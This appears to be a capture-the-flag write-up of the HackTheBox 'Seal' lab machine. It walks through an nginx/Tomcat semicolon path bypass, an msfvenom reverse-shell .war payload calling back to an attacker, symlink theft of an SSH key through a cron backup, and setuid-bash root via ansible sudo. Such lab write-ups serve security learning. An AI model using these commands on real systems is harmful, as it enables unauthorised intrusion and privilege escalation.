title: HackTheBox Seal Write-up
---

<h2>Overview</h2>

Seal is a medium-rated HackTheBox linux machine. An exposed GitBucket service reveals Apache Tomcat credentials, but I don't have direct access to the manager panel. Instead, I discover
the presence of a reverse proxy which I exploit by abusing the parsing differences between the web servers, allowing access to the manager panel. A backup-creating cron job is exploited
to create a readable copy of luis' ssh key. Once I ssh in as luis, sudo reveals ansible commands may be run as root, allowing me to give /bin/bash setuid permissions
and gain a root shell.

<h2>Initial Enumeration</h2>

Initial nmap scan reveals ports 22, 443, and 8080 open to us.

<h2>GitBucket</h2>

Heading over to port 8080 reveals a GitBucket page.

![image](https://user-images.githubusercontent.com/44827973/143973584-3feda7fe-ef33-4bed-8eb4-5c6318a7c3d1.png)

Google reveals GitBucket's default credentials.

![image](https://user-images.githubusercontent.com/44827973/143973741-194c6dfb-c4d7-44f0-becd-c54b48130c95.png)

These did not work, so instead I registered an account and signed in.

<h3>Tomcat credentials</h3>

I can see there are two webservers listed here.

![image](https://user-images.githubusercontent.com/44827973/143973886-59e8e32b-1066-453c-b5d9-751a3d2f9827.png)

Knowing Tomcat credentials are in plaintext in a file called tomcat-users.xml, I check root/seal_market/tomcat/tomcat-users.xml. Only the default credentials are shown.

I am not familiar with GitBucket. However, knowing it is probably Git-related, and Git is all about version control, its worth checking for older versions of files.

As is evident from the tomcat GitBucket page, there have been 5 commits in the past.

![image](https://user-images.githubusercontent.com/44827973/143975221-a27557ac-39b3-4c43-a29b-fcb4bc3167c6.png)

I check the change history, and am rewarded with tomcat credentials.

![image](https://user-images.githubusercontent.com/44827973/143975259-93d23d44-a606-4c87-9e81-06ad6de41bcc.png)
![image](https://user-images.githubusercontent.com/44827973/143975271-845601ae-5126-4334-8f20-deac3ced574c.png)

I try to log into the manager panel, but I am Forbade by the nginx server.

![image](https://user-images.githubusercontent.com/44827973/143975421-f305d17b-4811-4699-8a72-8d6178acf7db.png)

<h3>Multiple servers</h3>

On an earlier page I noticed a ToDo list which provides interesting details.

![image](https://user-images.githubusercontent.com/44827973/143975590-ca1afbe1-2154-46b5-b090-5738599cec31.png)

It suggests the manager panel has not yet been disabled and we may yet be able to access it.

As was revealed earlier, there appears to be two web servers running - nginx and tomcat. Checking the Issues tab reveals correspondence between devs, which seems to suggest nginx is used as a load balancer.

![image](https://user-images.githubusercontent.com/44827973/143975961-9111c08e-2d29-4d96-baa0-ee9de834a631.png)

Further evidence of two web servers can be seen by attempting to log into the manager panel, compared to typing in a non-existent resource. See how the server error messages differ, one being nginx and the other being Apache Tomcat?

![image](https://user-images.githubusercontent.com/44827973/143975421-f305d17b-4811-4699-8a72-8d6178acf7db.png)

![image](https://user-images.githubusercontent.com/44827973/143977497-b03fb563-c2c1-4c45-acb3-760bf45d2540.png)


Checking the server blocks / routes defined by the nginx server can be done by looking at the nginx/sites-available/default file:

```
	location /manager/html {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
#		try_files $uri $uri/ =404;
	}
 
 
	location /admin/dashboard {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
#		try_files $uri $uri/ =404;
	}
 
        location /host-manager/html {
                if ($ssl_client_verify != SUCCESS) {
                        return 403;
                }
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
#               try_files $uri $uri/ =404;
        }
 
 
	location / {
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
}	

```
A number of location directives are defined here. Notice that the tomcat manager panel URL does get forwarded if I pass the "ssl_client_verify" check. All other URLs not matching any of the listed directives will be sent to the apache server via the catch-all "/". Earlier, when I attempted to access "/manager/html", I was forbidden by the nginx server because I matched the location directive, and failed the ssl client verify check. When I type in gibberish, my request of "/fewf" is forwarded to the tomcat server which responds saying it can't find that page.

<h3>Abusing parsing differences between web servers</h3>

Different web servers parse certain characters in different ways. [https://superevr.com/blog/2011/three-semicolon-vulnerabilities](Apache Tomcat supports the passing of "path parameters" within the URL), which are separated by a semicolon. Nginx reads the entire URL string and does nothing with the semicolon. By injecting a semicolon, we are able to bypass the routes above (and therefore bypass ssl_client_verify) to access the manager panel.

If I type in the URL "https://10.10.10.250/manager;test/", I am greeted with the login prompt for the manager panel.

![image](https://user-images.githubusercontent.com/44827973/143978367-6d34173c-3bdc-41f4-9d9f-b2edb306ffc2.png)

Here is how each server translates "/manager;test/":

![image](https://user-images.githubusercontent.com/44827973/143978420-d8e3704f-f4b8-4589-97e7-1446229df66f.png)

Now I am able to input the credentials we found earlier, and successfully log into the manager panel.

<h2>Shell as tomcat</h2>

Now that I am able to access the Tomcat manager panel, it is trivial to get a shell. I simply need to create a .war shell and upload and deploy it, catching it on a reverse shell
listener on my attacker machine.

I use this command to generate a .war reverse shell, courtesy of [https://netsec.ws/?p=331](this website):
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

I create a netcat listener for the reverse shell. I upload it and deploy the .war file:

![image](https://user-images.githubusercontent.com/44827973/143978836-e3a660f8-1667-432a-807c-57d82de22761.png)
![image](https://user-images.githubusercontent.com/44827973/143978843-4d14d7ba-d08b-451c-9d5b-8d50b13170b6.png)

and get a reverse shell back.

![image](https://user-images.githubusercontent.com/44827973/143978978-8f97d55c-9479-4d39-90a3-e349be7894e1.png)

<h2>Shell as luis</h2>

I upgrade my shell to a fully interactive TTY shell using python. This means I can input certain commands without the shell literally interpreting, such as moving around with arrow keys / ctrl+c to cancel hung commands.

![image](https://user-images.githubusercontent.com/44827973/143979042-6738cc7a-a1bd-4ae2-8173-96e26c2f045b.png)

Now I'm ready to start hunting for ways to escalate. Checking the contents of /etc/passwd reveals the user "luis".

Checking processes with "ps aux" reveals luis is intermittently running a command, likely as per a cron job:

![image](https://user-images.githubusercontent.com/44827973/143979432-df8d50fe-521d-4f46-ba19-7e0faaa29815.png)

I'm able to read run.yml:

![image](https://user-images.githubusercontent.com/44827973/143979703-e4b31013-8e0f-4a9a-87fa-f1a4e1e76d46.png)

The run.yml file copies files from /var/lib/tomcat9/webapps/ROOT/admin/dashboard and place them in /opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz.

I check for write permissions on /var/lib/tomcat9/webapps/ROOT/admin/dashboard. I can't write to it, however I can write to the uploads directory within dashboard:

![image](https://user-images.githubusercontent.com/44827973/143979839-76781647-cad3-475d-a8e1-3a14a9c6658a.png)

<h3>symlink abuse to steal luis' ssh key</h3>

As per the outlined section in the run.yml screenshot, the Copy Files task will also copy links. If set to yes, the [https://docs.ansible.com/ansible/2.5/modules/synchronize_module.html](Ansible documentation) states "Copy symlinks as the item that they point to (the referent) is copied, rather than the symlink." Could we use this to steal luis' ssh key?

Within the writeable uploads directory, I create a soft symlink to luis' ssh key.

![image](https://user-images.githubusercontent.com/44827973/143980282-b7670359-ac07-4858-a463-225b3755b826.png)

I wait for the cron job to run and the backup to be created.

![image](https://user-images.githubusercontent.com/44827973/143980324-12cbff02-497c-43b9-8abf-e33299573dbf.png)

I transfer the .gz to my attack machine. I do this by hosting a python web server on port 9999 on the target, then wget it from my host.

![image](https://user-images.githubusercontent.com/44827973/143980396-6a3b4996-430a-46de-8ac8-ccd3b02aa462.png)
![image](https://user-images.githubusercontent.com/44827973/143980406-f1c0e1b3-3554-4c5c-bf16-279d06b6dbd0.png)

*Note: at some point I had added the IP address of the target to my /etc/hosts file with the hostname seal.htb*

Apparently some characters can mess with tar, so I rename it before I extract the contents.

![image](https://user-images.githubusercontent.com/44827973/143980556-475cbe5c-cc67-4007-9f49-7045f7c92097.png)

Within the uploads file, I find luis' private ssh key.

![image](https://user-images.githubusercontent.com/44827973/143980673-e893475d-9ae1-4bcf-8401-f72f3ea9479a.png)

I remember to chmod 0600 the key and then I can ssh in.

![image](https://user-images.githubusercontent.com/44827973/143980729-0d5ea69b-fda7-4308-9400-400c9a8ccee2.png)

Then I can read user.txt:

![image](https://user-images.githubusercontent.com/44827973/143980798-d07b77a2-9226-4427-b984-ef5886cefdca.png)

<h2>Becoming root</h2>

<h3>Sudo commands</h3>

Checking sudo commands as luis, I see that luis can run any ansible commands as root.

![image](https://user-images.githubusercontent.com/44827973/143981539-80bd04b3-70e2-4603-8852-16725a99481b.png)

<h3>Ansible tasks</h3>

My goal now is to create a copy of run.yml with my own command of setting the setuid bit on /bin/bash, thereby allowing me to become effective root.

As per the [https://docs.ansible.com/ansible/latest/user_guide/become.html](Ansible Docs) I see a section on running a command as other users:

![image](https://user-images.githubusercontent.com/44827973/143981902-318f3345-cc67-43b2-9d4a-961920e58e69.png)

I modify my copy of run.yml with a PoC. When run with sudo, I'm hoping it will create a file in /var/tmp as root.

![image](https://user-images.githubusercontent.com/44827973/143981933-34f8fbdb-2f24-4113-8791-ea7911a97a1b.png)

When I run the sudo command, it appears I am successful - note that the file is created as root.

![image](https://user-images.githubusercontent.com/44827973/143982006-45f0b0f0-9001-4423-9b10-f82081018f3b.png)

Now, onto the privilege escalation. I modify run.yml with a task that makes bash setuid, with the command `chmod u+s /bin/bash`.

![image](https://user-images.githubusercontent.com/44827973/143982877-6e4a3538-18c9-4a0b-ab7b-dd6aa1724026.png)

I run the sudo command again and find bash now has the setuid bit set.

![image](https://user-images.githubusercontent.com/44827973/143982838-430915b3-72aa-4850-8072-6e1cdc02d89b.png)

I gain root privileges by running /bin/bash with "-p" flag to drop privileges.

![image](https://user-images.githubusercontent.com/44827973/143982846-a0475cdc-a77e-49fe-9f03-e8a2d256895b.png)
